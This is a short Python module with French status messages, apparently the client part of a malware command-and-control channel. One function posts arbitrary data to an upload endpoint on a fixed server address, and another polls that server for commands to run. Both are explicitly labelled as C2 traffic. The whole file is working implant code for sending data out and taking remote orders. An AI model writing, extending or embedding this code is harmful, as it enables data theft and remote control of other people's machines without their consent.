import requests

SERVER = "http://172.20.10.7:5000"

UPLOAD_URL = SERVER + "/upload"
COMMAND_URL = SERVER + "/commands"


def send_to_c2(data):

    try:

        response = requests.post(
            UPLOAD_URL,
            json=data,
            timeout=10
        )

        if response.status_code == 200:

            print("[C2] Données envoyées avec succès.")
            return True

        print(f"[C2] Erreur HTTP {response.status_code}")
        return False

    except Exception as e:

        print(f"[C2] Impossible de contacter le serveur : {e}")
        return False


def get_command():

    try:

        response = requests.get(
            COMMAND_URL,
            timeout=5
        )

        if response.status_code != 200:

            return None

        command = response.json()

        if not command:

            return None

        return command

    except Exception:

        return None
